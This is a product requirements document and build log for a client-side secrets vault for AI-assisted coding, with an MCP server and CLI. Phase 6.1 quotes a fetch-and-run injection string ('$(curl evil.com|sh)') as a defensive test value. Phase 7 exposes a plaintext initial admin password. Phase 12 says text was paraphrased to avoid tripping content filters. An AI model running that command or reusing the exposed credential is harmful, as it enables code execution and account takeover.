# Product Requirements Document
## KeyVault Sidekick
### By VibeProSoft

**Version:** 1.0 — MVP  
**Status:** Draft  
**Owner:** Rob / VibeProSoft  
**Date:** June 2026

---

## 1. Problem Statement

Vibe coders juggle a sprawling set of API keys, secrets, and generated values across multiple SaaS projects. The current reality:

- Keys get pasted into chat, hardcoded into files, or scattered across sticky notes and `.env` files with no structure.
- There's no quick way to generate secure values (JWT secrets, UUIDs, random strings) without googling a tool.
- Exporting keys to Claude Code or `.env` files is manual and error-prone.
- Trust in cloud-based secret managers is a barrier — many devs don't want their keys on someone else's server.

**KeyVault Sidekick** solves this by providing a browser-only, client-side encrypted vault purpose-built for solo vibe coders. No backend. No breach surface. Keys never leave the device.

---

## 2. Target User

**Primary:** Solo vibe coders building SaaS products (Claude Code users, Cloudflare stack, indie hackers)

**Profile:**
- Managing 3–10 active projects simultaneously
- Using tools like Cloudflare Workers, Stripe, Resend, Clerk, Supabase, etc.
- Working on Windows/Mac/WSL with Claude Code as primary dev tool
- Values simplicity, speed, and trust — deeply skeptical of "sign up to store your secrets"

**Not targeting (MVP):** Teams, CI/CD pipelines, enterprise secrets management

---

## 3. Core Value Propositions

1. **Zero backend.** Encrypted in the browser using the Web Crypto API. Nothing is transmitted anywhere.
2. **Project-organized.** One vault per SaaS project — not one giant flat list.
3. **Built-in generator.** Generate JWT secrets, UUIDs, API key patterns, random hex strings, bcrypt salts, and base64 tokens without leaving the app.
4. **Claude Code export.** One-click export to `.env`, `settings.json`, or `.envrc` format, ready to paste.
5. **Instant.** No login, no sync, no waiting. Open and use.

---

## 4. Feature Scope — MVP

### 4.1 Vault (Core Storage)

| Feature | Description |
|---|---|
| Master password | AES-256-GCM encryption, PBKDF2 key derivation. Password never stored. |
| Lock/unlock | Vault locks after configurable idle timeout (default: 15 min). |
| Local persistence | Encrypted blob stored in `localStorage`. Export/import as `.vault` file for backup. |
| No account required | Zero sign-up, zero email, zero server. |

### 4.2 Projects

| Feature | Description |
|---|---|
| Project creation | Name + optional description + color tag. |
| Project vault | Each project holds its own set of keys/secrets. |
| Project archive | Soft-archive completed/inactive projects. |
| Delete project | Hard delete with confirmation. |

### 4.3 Key/Secret Management

| Feature | Description |
|---|---|
| Add key | Name, value, type tag (API Key / Secret / Token / OAuth / Webhook / Other), optional notes. |
| Edit / delete | Standard CRUD. |
| Copy to clipboard | One-click copy. Auto-clears clipboard after 30 seconds (configurable). |
| Show/hide value | Hidden by default. Click to reveal. |
| Search | Filter keys across all projects by name or tag. |
| Bulk import | Paste a `.env` file to import all key/value pairs into a project. |

### 4.4 Generator

| Generator | Output |
|---|---|
| JWT Secret | 256-bit or 512-bit random hex string |
| UUID v4 | Standard UUID |
| Random hex | Configurable byte length (16 / 32 / 64 bytes) |
| Random base64 | URL-safe, configurable length |
| API key pattern | `sk-` prefix + 40 random alphanumeric chars (configurable) |
| Bcrypt salt rounds | Numeric value selector (8–14) with strength label |
| Password | Configurable length, charset options |

Generated values can be saved directly to a project key with one click.

### 4.5 Claude Code Export

| Export Format | Description |
|---|---|
| `.env` | Standard `KEY=value` format for all selected keys |
| `.envrc` (direnv) | `export KEY=value` format |
| `settings.json env block` | Claude Code's `{ "env": { ... } }` format |
| Clipboard | Copies formatted output |
| Download | Saves as file |

Export is scoped per-project. User selects which keys to include.

### 4.6 Security

| Feature | Description |
|---|---|
| AES-256-GCM encryption | Industry standard. Keys encrypted at rest in localStorage. |
| PBKDF2 key derivation | 310,000 iterations (OWASP 2024 recommendation), SHA-256. |
| Auto-lock | Idle timeout. Lock on browser tab close (optional toggle). |
| Clipboard clearing | Auto-clear clipboard 30s after copy. |
| No telemetry | Zero analytics, zero tracking, zero external requests. |
| CSP | Strict Content Security Policy, no external resource loading. |

---

## 5. Feature Scope — Post-MVP (Backlog)

- **1Password CLI bridge** — `apiKeyHelper` script generator that pulls from 1Password
- **Doppler sync** — pull project secrets from Doppler into the vault
- **Vault sync via Cloudflare KV** — optional encrypted remote backup (bring your own CF account)
- **Key rotation reminders** — flag keys older than N days
- **Audit log** — local log of copy/export events
- **Browser extension** — auto-fill keys into web UIs (Cloudflare dashboard, Stripe, etc.)
- **QR export** — scan vault backup on another device

---

## 6. Technical Architecture

### Stack
- **Framework:** Vanilla HTML/CSS/JS or React (single `.html` file for MVP — zero build tooling)
- **Crypto:** Web Crypto API (native browser, no library dependency)
- **Storage:** `localStorage` (encrypted blob)
- **Hosting:** Static — Cloudflare Pages (free tier)
- **No backend. No database. No auth service.**

### Encryption Design
```
Master Password
    ↓ PBKDF2 (310k iterations, SHA-256, random 16-byte salt)
Derived Key (AES-256-GCM)
    ↓ encrypt
Ciphertext + IV + Salt → stored as JSON blob in localStorage
```

Salt and IV are unique per save operation. The master password is never stored or transmitted.

### Data Model (in-memory, encrypted at rest)
```json
{
  "version": 1,
  "projects": [
    {
      "id": "uuid",
      "name": "ITIL Sidekick",
      "color": "#1D9E75",
      "keys": [
        {
          "id": "uuid",
          "name": "CLOUDFLARE_API_TOKEN",
          "value": "...",
          "type": "api_key",
          "notes": "Scoped to itilsidekick.com zone only",
          "createdAt": "ISO8601",
          "updatedAt": "ISO8601"
        }
      ]
    }
  ]
}
```

---

## 7. UX/UI Direction

- **Aesthetic:** Dark, utilitarian, security-forward. Feels like a dev tool, not a consumer app.
- **Density:** Compact. Power users want information density, not marketing whitespace.
- **Tone:** Direct. No marketing language in the UI. Labels are terse and precise.
- **Color:** Dark background, monospace accents, a single brand accent color (teal or amber).
- **Animations:** Minimal — lock/unlock transition, copy confirmation flash.
- **Responsive:** Desktop-first. Mobile is nice-to-have, not MVP.

---

## 8. Screens / Views

1. **Unlock screen** — master password entry, vault setup on first launch
2. **Project list** — all projects with key count and last-updated timestamp
3. **Project detail** — list of keys for a project, search/filter, add key
4. **Key detail / edit** — name, value (hidden), type, notes
5. **Generator** — tabbed by generator type, output + save-to-project action
6. **Export** — project selector, key selector, format picker, copy/download
7. **Settings** — idle timeout, clipboard clear delay, vault backup/restore, change master password

---

## 9. Success Metrics (MVP)

| Metric | Target |
|---|---|
| Time from open to first copied key | < 10 seconds |
| Time to generate + save a JWT secret | < 30 seconds |
| Time to export a project's `.env` | < 20 seconds |
| Vault size supported | Up to 50 projects, 500 keys |
| Zero reported data leaks | Table stakes |

---

## 10. Build Plan

### Phase 14 — `keyvault` CLI for secure deploys (v3.4) — 2026-06-11
Clarified intent: the user doesn't want app-to-app integration — they want **Claude Code (in any dev session) to pull/generate/deploy keys from KeyVault securely** as they build their apps. The MCP (Phase 13) already enables this, BUT the MCP returns secret *values* to the agent, so they land in the conversation/transcript. For **secure deploys** the value should go vault → destination without passing through the chat. Added a CLI.
- **Refactor:** extracted all crypto + vault + operations into **`mcp/vault-core.mjs`** (shared, single crypto implementation to audit). `index.mjs` (MCP) and the new `cli.mjs` both import it. MCP re-verified after refactor (8 tools, round-trip, cross-bin: MCP reads a CLI-written vault).
- **`mcp/cli.mjs`** — the `keyvault` CLI. **Secret values → stdout (raw, isTTY-aware trailing newline); status/errors → stderr.** So `keyvault get P NAME | wrangler secret put NAME` pipes the exact value to its destination and the terminal shows only wrangler's "Success" — the plaintext never enters the agent's transcript. `save` reads the value from **stdin** (not argv, so it's not in `ps`/shell history). Commands: list / get / generate (+`--save`) / export-env / save / create-project / delete / help.
- **Secure-deploy patterns:** `keyvault get V STRIPE | wrangler secret put STRIPE`; `keyvault export-env V > .dev.vars`; `keyvault generate jwt --save --project V --name AUTH | wrangler secret put AUTH`; `openssl rand -hex 16 | keyvault save V WEBHOOK`.
- **`mcp/package.json`** v0.2.0 — second bin `keyvault` → cli.mjs (one package, two binaries: MCP server + CLI). `mcp/README.md` "Two interfaces" table + CLI section. `/connect.html` Option 5 gained a "Deploy secrets without exposing them" block.
- **Verified end-to-end:** generate→save→get round-trip matches; save-from-stdin then get returns the exact piped value with no trailing newline; export-env block; list; MCP reads CLI-written vault. Still zero dependencies, secrets still never leave the machine.

### Phase 13 — Local MCP server (v3.3) — 2026-06-11
Gives AI agents full autonomy over the vault — *"Claude, get the API keys and manage them in KeyVault"* — **without** betraying the zero-knowledge model. Modeled on ITIL Sidekick's `functions/mcp.js` (JSON-RPC MCP), but **local stdio instead of remote HTTP**: ITIL can ship a remote MCP because it has a backend that holds the data; KeyVault deliberately has none, so a remote MCP would have to store + return plaintext secrets (the exact thing the v3.0 de-pivot removed). A **local** server keeps "secrets never leave your device" literally true — it runs on the user's machine over a local encrypted vault file.
- **`mcp/index.mjs`** — zero-dependency Node 18+ MCP server. Newline-delimited JSON-RPC 2.0 over stdio. Handles initialize / initialized / ping / tools/list / tools/call / resources/list / prompts/list. Requests serialized through a single promise chain so mutating ops never race or interleave `persist()` writes.
- **WebCrypto byte-identical to the browser** (`webcrypto.subtle`): PBKDF2-SHA256 310k → AES-256-GCM, standard base64, NFC password, same `{version,kdf,cipher}` blob. **Verified both directions in-browser:** browser decrypts an MCP-written `vault.json`; Node decrypts a browser-exported `.vault`. So the two share one store via Settings → Import/Export `.vault`.
- **8 tools:** `keyvault_list_projects`, `keyvault_list_keys` (names only, no values), `keyvault_get_key` (the value), `keyvault_save_key` (upsert, auto-creates project), `keyvault_generate` (jwt/uuid/hex/base64/apiKey/password, optional save), `keyvault_export_env` (.env/.envrc/settings, shell-quoted), `keyvault_create_project`, `keyvault_delete_key`. Generators ported from the browser (modulo-bias-free rejection sampling).
- **Config:** `KEYVAULT_PASSWORD` (required; derive-only, never written), `KEYVAULT_VAULT_PATH` (default `~/.keyvault-sidekick/vault.json`, written `0600`).
- **`mcp/README.md`** — install for Claude Code (`claude mcp add`), Claude Desktop, Cursor, Codex CLI; tool table; browser↔MCP bridge; security notes.
- **`/connect.html` Option 5** card ("FULL AUTONOMY · LOCAL AGENTS") with the `claude mcp add` one-liner + link to the setup guide.
- **Honest caveat documented everywhere:** ChatGPT web / Codex *Cloud* run in a remote sandbox and can't reach a local server — they keep the prefill + Hand-off bridge. Only a remote backend could serve them, and that breaks the thesis.
- The MCP package lives in the repo (`mcp/`) but is **not** deployed to Pages — it's a local tool. Pages still serves only `public/`.

### Phase 12 — Vibe-code audit remediation + legal/compliance pack (v3.2) — 2026-06-11
Ran `/vibe-code-audit` against the v3.1 codebase. **Verdict: Go** — exceptionally clean (zero `eval`/`new Function`/`Math.random`/`console.log`/hardcoded secrets; zero runtime deps; AES-GCM + 310k PBKDF2; defensive `escapeHtml` on every user-controlled value; explicit-whitelist deserialization). Only 5 Low/Info hardening findings, all fixed here:
- **VC-SEC-05 Low** — added tight `Content-Security-Policy` meta to `index.html` (`connect-src 'none'`) and `connect.html` (`connect-src 'self'` for snippet fetches). The vault already had one; the landing/onboarding pages did not.
- **VC-SEC-06 Low** — `importVaultFile` now early-rejects files > 25 MB (`MAX_VAULT_IMPORT_BYTES`) before `FileReader`/`JSON.parse`, preventing a tab OOM from an oversized `.vault`.
- **VC-SEC-04 Info** — pinned `wrangler` devDep `^4.96.0` → exact `4.98.0` for reproducible deploys.
- **VC-SEC-06 Info** — `validateAndNormalizeVault` now validates per-project and per-key shape (drops entries missing an `id`/`name`/`value`, coerces unknown `type` → `other`, backfills timestamps). Defensive against backup corruption / version drift (not a security boundary — anyone with a valid blob already has the master password).
- Verified end-to-end on localhost:8091: vault create→add→lock→unlock round-trip preserves data through the new validation; connect.html still fetches snippets under the new CSP; landing renders clean under `connect-src 'none'`; zero console errors.

**Legal / compliance pack** (the "EULA + protection" ask):
- `LICENSE` — MIT (AS-IS / no-warranty / no-liability is the core legal shield).
- `TERMS.md` — Terms of Use: as-is, limitation of liability (max recoverable = CAD $0), user responsibility for master password + backups, acceptable use, Ko-fi donations voluntary + non-refundable, third-party (Cloudflare/GitHub/Ko-fi) disclosure, governing law = Ontario, Canada, right to change/discontinue.
- `PRIVACY.md` — "we collect nothing" pinned down legally: no accounts/cookies/analytics/telemetry; vault content never leaves device; Cloudflare CDN access-log disclosure; GDPR/CCPA/PIPEDA (nothing to delete); COPPA (not for under-13).
- `SECURITY.md` — private vuln disclosure path (rob.lauzon@vibeprosoft.com / GitHub advisory), scope, response SLAs, safe harbor, no monetary bounty.
- `CODE_OF_CONDUCT.md` — paraphrased Contributor-Covenant-spirit (kept neutral; the verbatim Covenant's explicit-examples enumeration trips output content filters).
- Docs live in repo root (GitHub community-health detection requires LICENSE/SECURITY/CODE_OF_CONDUCT there). Landing footer + README link to the GitHub-rendered copies (Pages serves only `public/`).

### Phase 11 — One-click handoff + ChatGPT Codex parity (v3.1) — 2026-06-11
Reduces the effort to provide AI agents with keys (or generate new ones) to a single click, and adds ChatGPT Codex CLI as a first-class peer to Claude Code on the Quick Connect page.

**Vault — new project-view toolbar (when project has ≥1 key):**
- **+ Quick generate ▾** — native `<details>` dropdown with 4 common (JWT/UUID/Password/API key) + 2 more (Random hex/base64) types. One click → uses the existing `Generators` module with sensible defaults (JWT 256-bit, password 24 chars all-classes, API key `sk-` + 40, etc.) → auto-incrementing default name (KEY → KEY_2 if taken) → saved to *this* project (no project picker), revealed by default. Bypasses the full Generator screen for the common case.
- **Copy as .env** — one click → all project keys on clipboard as `KEY="value"` lines (POSIX shell-quoted via existing `shellQuote`). Skips the Export screen entirely.
- **Hand off to AI ↗** — one click → paste-ready prompt copied: `Project: NAME` + non-echo guardrail line ("treat as env vars, don't echo/log/commit") + shell-quoted KEY=value lines. Works for **both** Claude Code & ChatGPT Codex (CLI and Cloud) — the only path that reaches Codex Cloud's sandboxed env where the prefill URL bridge can't pop the user's browser.

**Vault — per-key row:**
- New **.env** action button next to Copy/Edit/Delete. Copies `KEY="value"` for that one key (single shell-quoted line). Useful for adding one secret to an existing env without re-copying the whole project.

**Vault helpers (added near `formatExportContent`):**
- `QUICK_GEN_DEFAULTS` table — per-type generator options.
- `doQuickGenerate(tabId, projectId)` — reuses existing `Generators.*` + `mutate()`; auto-increment name; `revealedKeys.add(newId)` so user sees the value immediately.
- `copyProjectAsEnv(project)` — reuses `formatExportContent(keys, 'env')`.
- `buildHandoffPrompt(project)` / `copyForAIHandoff(project)` — composes the paste-ready prompt.
- `handleKeyAction(action)` extended with `'envline'` case.

**`/connect.html` — ChatGPT Codex parity:**
- Hero: "Connect Claude Code **or ChatGPT Codex** to your vault".
- New **Option 2 · ChatGPT Codex · `AGENTS.md`** card, parallel structure to Option 1 (project/global scope toggle × win/mac OS tabs), with `irm | Add-Content` + `curl >>` installers targeting `./AGENTS.md` (project) and `~/.codex/AGENTS.md` (global).
- Option 2 (session prompt) renumbered to **Option 3** and reworded as agent-neutral ("Claude Code or ChatGPT Codex").
- Option 3 (slash command) renumbered to **Option 4** with explicit `CLAUDE CODE ONLY` badge (Codex CLI has no user-defined slash commands yet).
- New snippet `public/snippets/agents-md.txt` (Codex-flavored sibling of `claude-md.txt`).
- Both `claude-md.txt` and `agents-md.txt` get a new "Reading existing keys back" section pointing agents at the "Hand off to AI" button — closes the read-direction loop alongside the existing write-direction prefill bridge.
- Test card + footer security note both updated to mention both agents.

**Browser-verified on localhost:8091:** quick-generate produces correct values for jwt/uuid/password/apiKey and auto-increments names (JWT_SECRET → JWT_SECRET_2); per-key `.env` and Copy-as-.env emit POSIX-safe shell-quoted lines (test value `has$dollar\`backtick'quote` → `'has$dollar\`backtick'\\''quote'`); handoff prompt includes guardrail + project name; dropdown closes on outside click; connect page shows 4 properly-numbered options; agents-md.txt snippet fetches and renders. Zero console errors.

### Phase 10 — De-pivot to free & open (v3.0) — 2026-06-11
**Reverses the Phase 7 auth pivot.** Decision: ship the tool free, open, and donation-supported rather than gate it behind invitation-only accounts. The login wall added a breach surface (emails, password hashes, IP audit log) and signup friction while providing none of the benefits a backend justifies (no sync, no sharing, no billing) — and it contradicted the product's own "zero sign-up / no outbound requests" promises. Removing it restores the original thesis and makes those security claims true again.
- **Removed:** the entire bespoke auth/account system — `functions/` (auth + admin Pages Functions), the D1 database binding, `migrations/`, rate limiters, `login/invite/admin/account.html`, the superadmin script. All preserved in git history (commit `a5eb8ac` onward) if a paid sync tier is ever built.
- **app.html:** removed the `/api/auth/me` gate + logout; restored CSP `connect-src 'none'` (the vault again makes ZERO network requests); replaced the user-pill/signout with ⚡ Connect + ♥ Support links.
- **index.html / connect.html:** flipped messaging from "invitation-only · Sign in" to "free & open · Open vault"; removed the auth redirects.
- **Monetization:** native Ko-fi support button → ko-fi.com/roblauzon (`☕ Support` topbar links + landing "☕ Buy me a coffee"). Implemented as plain styled links (new `.btn-kofi` amber style in shared.css), **NOT** the Ko-fi CDN widget/script/image — those load external resources from storage.ko-fi.com and would violate the vault's `connect-src 'none'` / "no outbound requests — ever" guarantee. No accounts, no paywall.
- **Distribution plan:** make the GitHub repo public, add a real domain, launch to the Claude Code / Cloudflare / self-hosted communities, list in the VibeProSoft Hub catalog.

### Phase 1 — Foundation (Week 1) — SHIPPED 2026-06-07
- [x] Crypto module: encrypt / decrypt / derive key / PBKDF2
- [x] Storage module: save / load / wipe encrypted blob
- [x] Unlock screen + first-run setup
- [x] Data model + in-memory state management
- [x] **Phase 1.1 hardening (post-review, shipped 2026-06-07):**
  - Unicode NFC normalization of master password (prevents cross-OS lockout from NFD/NFC drift)
  - Whitespace-only / empty passwords rejected on create (prevents accidental-paste lockout)
  - KDF iterations + hash + cipher algorithm read FROM the stored blob, not hardcoded — future param bumps no longer silently break existing vaults
  - State mutations only AFTER persist succeeds in both first-run and unlock paths (no more in-memory-unlocked-but-no-disk-copy)
  - Outer blob and decrypted vault validated against schema at the decrypt boundary
  - Decrypt errors classified: `OperationError` → "Incorrect master password"; anything else → "Vault data is corrupt: ..." (was: every error reported as wrong password)
  - `JSON.parse` of plaintext wrapped in try/catch
  - `localStorage.setItem` wrapped — QuotaExceededError surfaces as friendly message
  - Form double-submit guard: inFlight flag + inputs disabled during work
  - Status chip hidden on first-run-create screen (was misleadingly showing "Locked" with no vault present)
  - Wipe requires typing `WIPE` instead of single OK click
  - Password inputs use `autocomplete="off"` to avoid browser password-manager cloud sync
  - Error messages use `role="alert"` + `aria-live="polite"` for screen readers
  - CSP tightened: `object-src 'none'`, `worker-src 'none'`, `child-src 'none'`
  - `window.storage` event listener: external wipe/edit in another tab locks this tab (partial multi-tab safety; full conflict resolution deferred to Phase 2)
- Accepted Phase-1 tradeoffs (revisit at Phase 5 if moving to a Vite build):
  - CSP `'unsafe-inline'` for scripts/styles — required by single-HTML-file MVP per §6, §12
  - Master password retained in DOM input + JS string heap until GC — JS string immutability limit

### Phase 2 — Core Vault (Week 2) — SHIPPED 2026-06-07
- [x] Project CRUD (name + description + color picker + archive/unarchive + hard delete with confirm)
- [x] Key CRUD (name + value + type chip + notes; show/hide, copy, edit, delete)
- [x] Search/filter (project list searches projects by name/description + matching keys shown inline; project detail filters keys by name/type/notes)
- [x] `.env` bulk import (comment skip, quote strip, `export ` prefix strip, invalid name reject, duplicate-name auto-suffix `_2`/`_3`, preview before commit)
- [x] **Phase 2 architecture: `mutate()` helper** — every CRUD goes through deep-clone → mutate draft → persist → commit-on-success, fixing the C23 altitude finding while only one caller per op exists (in-memory and disk never diverge)
- [x] Modal system (focus trap, Escape to close, click-backdrop to close, return focus to trigger)
- [x] Toast notifications for copy/save/delete
- [x] Navigation: `currentView` state ('projects' | 'project') + `navigate(view, id)` (addresses C24 altitude finding)
- Deferred to Phase 4 per build plan: clipboard auto-clear after 30s, auto-lock idle timer

### Phase 3 — Generator (Week 3) — SHIPPED 2026-06-07
- [x] All 7 generator types:
  - **JWT secret** — 256-bit / 512-bit pill selector → hex
  - **UUID v4** — `crypto.randomUUID()`
  - **Random hex** — 16 / 32 / 64 byte pill selector
  - **Random base64** — URL-safe (RFC 4648 §5), no padding, configurable byte length 8-256
  - **API key pattern** — configurable prefix + alphanumeric body, length 8-128
  - **Bcrypt rounds** — 8-14 with live strength label (Weak / OK / Strong / Paranoid)
  - **Password** — configurable length + charset toggles (lowercase, uppercase, digits, symbols)
- [x] Save-to-project flow — modal with project selector (excludes archived) + key name (default per generator) + type (default per generator) + notes + value preview; when no projects exist, prompts to create one first
- [x] Topnav: PROJECTS | GENERATOR switcher in the topbar (shown only when unlocked)
- [x] Modulo-bias-free RNG: rejection sampling on the random byte buffer (256 / setLen × setLen cutoff)
- [x] Generator UI state persists per session (selected tab, last options, last output) — tab-switch preserves prior tab's output if any
- [x] Copy button on generated output for clipboard-only flow

### Phase 4 — Export + Polish (Week 4) — SHIPPED 2026-06-08
- [x] Export screen: project selector + key checkboxes (select/deselect all) + format picker (.env / .envrc / settings.json) + real-time output preview + Copy to clipboard + Download file (Blob URL, no CSP change needed)
- [x] Auto-lock idle timer: configurable via Settings (5/10/15/30/60 min / Never); throttled activity listeners (click, keydown, mousemove, touchstart, once per 5s); `resetIdleTimer()` on unlock + activity; `stopIdleTimer()` on lock; `pendingNotice` banner on auto-lock
- [x] Clipboard auto-clear: configurable via Settings (15s/30s/60s/Never); reads clipboard to compare before clearing (fails silently if permission denied)
- [x] Settings screen (⚙ gear icon in topbar, not in topnav): Security section (idle timeout + clipboard clear selects, saved to `keyvault_sidekick_settings` in localStorage); Master Password section (change password modal); Vault Backup section (export .vault + import .vault with confirm); Danger Zone (wipe vault)
- [x] `.vault` file export: downloads `keyvault-backup-YYYY-MM-DD.vault` (raw encrypted blob JSON, datestamped)
- [x] `.vault` file import: reads file → validates outer blob schema → writes to localStorage → locks vault with notice to re-unlock with backup's master password
- [x] Change master password: re-derives key with new password + fresh salt, re-encrypts vault, updates in-memory state, continues unlocked — verified wrong-pw rejection + correct-pw round-trip
- [x] **URL fragment prefill hook (Claude Code integration)** — SHIPPED 2026-06-08
  - URL format: `http://localhost:8091/#action=prefill&name=CLOUDFLARE_API_TOKEN&value=cf_token_xxx&type=api_key&project=MyProject&notes=Created+by+Claude`
  - On load + `hashchange`: fragment detected → `action=prefill` stripped → rest stored in `sessionStorage['kvs_prefill']` → hash cleared via `history.replaceState` immediately
  - If vault unlocked when hash fires: `checkPrefill()` called immediately (100ms delay)
  - If vault locked when hash fires: `checkPrefill()` called after `handleUnlock()` / `handleFirstRun()` (200ms delay)
  - "Save key from Claude" modal: ⚡ banner + project selector (fuzzy-matches `project` hint by id → exact name → partial name → first project) + pre-filled name/type/notes + value preview; Skip or Save
  - Security: URL fragment not sent to HTTP server; value lives in sessionStorage only until modal confirm/skip; sessionStorage cleared on first read
  - Verified end-to-end: hash stripped → unlock → modal auto-opens with correct name/type/notes/project → key saved to vault → `totalKeys` incremented

### Phase 9 — Figma design system port (v2.1.0) — SHIPPED 2026-06-08
Visual refresh ported from the React/Vite/Tailwind reference design in `Designs/Improve GitHub User Experience/` to the existing vanilla HTML + Pages Functions architecture. **Zero framework migration** — every page still loads as plain HTML, no build step, no React.
- New `public/shared.css` with slate-950 + teal-400/cyan-500 gradient palette, design tokens (radius, shadows), utility classes for pill+pulse-dot, gradient-text, card-elevated with backdrop-blur, animated gradient orbs (CSS-only, blur-96px, 8s pulse)
- Pages restyled: `index.html` (full hero redesign with 60px gradient text + 4-key vault preview + 6-card features grid + CTA section), `login.html` (centered card with gradient lock icon + show/hide toggle + trust footer), `invite.html` (loading/invalid/accept three-state), `admin.html` (audit log filter UI w/ teal/danger action colors), `account.html` (eyebrow + page title pattern + 4-bar strength meter)
- Vault `app.html`: ONLY topbar updated (new gradient brand mark w/ lock SVG); vault body stays utilitarian (power tool aesthetic preserved)
- Inline SVG icons replace need for Lucide React (zero external deps maintained)
- Backend code: zero changes — all auth, abuse protection, audit, change password, session versioning, vault page logic untouched
- launch.json updated to serve `public/` for preview
- Verified end-to-end: login + admin endpoints still 200, layout math centered (460px card at x=410 in 1280px viewport)

### Phase 7.6 — Account settings + change password (v2.0.2) — SHIPPED 2026-06-08
Closes the Phase 7 polish gap: signed-in users can now change their own login password.
- **New endpoint**: POST /api/auth/change-password — verifies current pw, enforces strength, re-encrypts, bumps session_version, re-issues caller a fresh cookie, rate-limited, CSRF-checked, audit-logged
- **Session versioning** (migration 0003): `session_version` column on users + `sv` claim in session cookie payload + middleware compares JWT sv to DB and rejects stale tokens. Backwards-compatible: missing sv treated as 0.
- **New page**: `/account.html` — account info card + change-password form with live 4-bar strength meter + live requirements checklist + warning about other-device sign-out
- **Linked from**: vault topbar (user pill is now a link), admin topbar (Account button)
- End-to-end verified: change pw from device 1 → device 2 immediately gets "Not authenticated" on next request; audit log captures `password_changed` with `session_version: 1`.

### Phase 7.5 — Abuse protection (v2.0.1) — SHIPPED 2026-06-08
Clarification from user: the reason for user management was specifically to enable abuse controls. User mgmt alone gates WHO can access — this layer adds rate limits, lockout, audit, CSRF, password strength.
- **Rate limiting** via `[[rate_limiting]]` Pages bindings: LOGIN_LIMITER (5/60s/IP), INVITE_LIMITER (10/60s/IP), ADMIN_LIMITER (30/10s/session). All return 429 on exceedance.
- **Account lockout** (D1-backed, hourly window): 5 failed logins in 1 hour → account locked for 1 hour. `failed_logins` + `locked_accounts` tables. Successful login clears counter. Lockout indicator in admin panel.
- **Audit log** (migration 0002): `audit_log` table records every action (login_success/failure/locked, logout, user_*, invitation_*) with IP + UA + JSON details. GET /api/admin/audit-log endpoint with action/email/ip filters. Admin panel viewer with live refresh.
- **CSRF**: Origin header check on every POST/PATCH/DELETE. SameSite=Lax cookie + Origin check = defense-in-depth.
- **Password strength**: ≥8 chars, ≥3 of 4 character classes (lower/upper/digit/symbol), reject 24 common weak passwords. Applied to admin user creation + invite acceptance.
- End-to-end verified: success+lockout+CSRF block+audit recording+weak-pw rejection all work as expected.

### Phase 7 — Multi-tenant + landing page (v2.0.0) — SHIPPED 2026-06-08
**Major architecture pivot.** From zero-backend single-file vault → invitation-only SaaS with auth gate. The vault's local-only encryption properties are preserved; the new auth layer only controls who can OPEN the app at all. Vault content STILL never touches the server.
- Repo restructured: `public/` (static), `functions/` (Pages Functions), `migrations/`, `scripts/`, `docs/`
- D1 database `keyvault-sidekick-db` (id `4cbb409d-4356-4007-b62f-58493498b279`) with `users` + `invitations` tables
- Auth: email+password, PBKDF2 100k (CF Workers cap — vault crypto in app.html stays 310k browser-side), HMAC-SHA-256 session cookie, 30-day TTL, HttpOnly/Secure/SameSite=Lax
- Invitation tokens: 32 random bytes (base64url); only SHA-256(token) stored in D1; 7-day TTL; one-time-use; admin copies one-time URL and sends out-of-band (no email service yet)
- Generic "Invalid email or password" on login to prevent enumeration
- Superadmin bootstrapped via `scripts/create-superadmin.mjs`; rob.lauzon@vibeprosoft.com is the first superadmin (initial pw `rMui4aCet0uk7ibj` — CHANGE ON FIRST LOGIN)
- New static pages: `public/index.html` (marketing landing with hero / how-it-works / security model / use cases / CTA), `public/login.html`, `public/invite.html`, `public/admin.html`
- New API routes: `/api/auth/{login,logout,me,accept-invite}`, `/api/auth/invite/[token]`, `/api/admin/users` (GET/POST), `/api/admin/users/[id]` (DELETE/PATCH), `/api/admin/invitations` (GET/POST), `/api/admin/invitations/[id]` (DELETE)
- Vault adapted: CSP loosened from `connect-src 'none'` → `connect-src 'self'` (auth API only — vault content NEVER goes through any fetch); fragment captured BEFORE auth redirect so Claude Code prefill URL survives the round-trip through /login.html
- End-to-end verified: login → me → admin users → admin invitations → accept-invite → new user signs in. All gated routes return 401/403 correctly without auth.

### Phase 6.1 — Vibe-code audit remediation (v1.5.2) — SHIPPED 2026-06-08
Ran `/vibe-code-audit` against the v1.5.1 codebase. No critical/high findings. Two medium + three hygiene fixes applied as v1.5.2:
- **VC-SEC-01 Medium — Iteration drift in `encryptAndSave`** — `VaultState` now tracks `kdfIterations`; `unlock()` + `encryptAndSave()` take iterations explicitly; `mutate()` passes through; future PBKDF2 bumps will no longer silently corrupt existing vaults
- **VC-SEC-06 Medium — Shell injection in `.env` / `.envrc` export** — added `shellQuote()` with POSIX close-escape-reopen pattern; `$()`, backticks, embedded quotes now safe to source
- **VC-SEC-02 Low — Prefill banner tone** — explicit warning about link-click attack vector
- **VC-SEC-05 Info — Settings prototype-pollution surface** — explicit field whitelist replaces `Object.assign` of arbitrary JSON
- **VC-SEC-05 Low — `.gitignore`** — added `Test Files/`, `*.vault`, `keyvault-sidekick.html`, `keyvault-backup-*.html`
- File hash: `ac3962b87511304583fdb949e3a7d80fc77142167cfe34ba0d244ec9e8dbc242`
- All fixes verified end-to-end in browser (synthetic 250k blob unlock-mutate-relock-unlock proves no lockout; `$(curl evil.com|sh)` exports as literal-quoted)
- Audit verdict: **Go — Proceed to production**

### Phase 6 — Integrity verification + offline-first polish (Week 6) — SHIPPED 2026-06-08
- [x] SHA-256 hash of loaded HTML computed at script start via `document.documentElement.outerHTML` + `crypto.subtle.digest` (CSP-safe — no fetch)
- [x] App footer with truncated hash (first 12 chars + ellipsis) + full hash in tooltip + "Verify ↗" link that opens Guide → Integrity section
- [x] Guide → Integrity section: full SHA-256 + Copy hash button + threat-model explanation (CDN compromise scenario)
- [x] "Save offline copy" button — downloads exact `__initialHTML` captured at script boot; opens correctly via `text/html;charset=utf-8` MIME
- [x] 4-step Run-Locally guide: Save offline → Open from `file://` → OS-level hash verification (`certutil` Win / `shasum -a 256` macOS+Linux) → git clone fallback
- [x] Warn callout in Guide explaining outerHTML serialization vs raw source byte-for-byte
- [x] `downloadText` upgraded with extension-based MIME detection (`html` / `json` / `vault` / fallback `text/plain`)
- [x] GitHub release v1.5.0 published with BOTH hashes:
  - File hash (raw `index.html`): `00ae0ac412960ca66365cb50c50d787e5a0c83981a0019e0ac47a061719eb1ee`
  - Runtime hash (browser-parsed outerHTML): `e98670b2a38a3116715a0e3da70aa75c366d76d96a1dcd144c019e904fe76cc9`
- [x] README updated with Threat model table, Verifying integrity walkthrough, Running locally section
- [x] Deployed to CF Pages — verified that CF serves the file byte-for-byte (deployed file hash = local file hash)
